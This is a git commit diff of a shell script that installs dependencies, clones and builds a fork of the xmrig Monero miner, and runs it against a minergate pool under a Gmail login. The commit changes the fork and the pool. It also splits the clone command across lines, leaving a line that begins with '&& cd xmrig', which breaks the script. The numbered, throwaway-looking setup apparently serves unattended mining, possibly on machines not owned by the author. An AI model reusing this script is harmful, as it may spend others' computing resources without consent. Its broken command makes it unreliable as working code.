337d62cab4b887de340b1b676c4a9e407a054dd2
pupi292 <76243779+pupi292@users.noreply.github.com>
2020-12-21 07:27:12 +0000

    Update su-5.sh

--- su-5.sh
+++ su-5.sh
@@ -5,5 +5,7 @@ sudo apt-get install -y make
 sudo apt-get install -y screen
 sudo apt-get install -y curl
 sudo apt-get install -y git
-sudo apt-get update && sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev libboost-all-dev automake git cmake libuv1-dev libmicrohttpd-dev libssl-dev && sudo sysctl vm.nr_hugepages=128 && rm -rf xmrig && git clone https://github.com/sabatmki/xmrig && cd xmrig && mkdir build && cd build && cmake .. && make
-./xmrig -a cn/r -B -l pro -R 10 -o stratum+tcp://pool.supportxmr.com:5555 -u 49QKBhqqXvV4Lo9cZuroG17onhV4VWhGtWb9n11qngRoMBz35pz3kjDfVuSh6zy7nDCZruQw5z3vHjPCHGTTEAZA9PnguVr -p x -k
+sudo apt-get update && sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev libboost-all-dev automake git cmake libuv1-dev libmicrohttpd-dev libssl-dev && sudo sysctl vm.nr_hugepages=128 && rm -rf xmrig && git clone https://github.com/pupi292/xmrig
+ && cd xmrig && mkdir build && cd build && cmake .. && make
+./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u myrnabauguessheilmannlrnhzv@gmail.com -p x -k
+
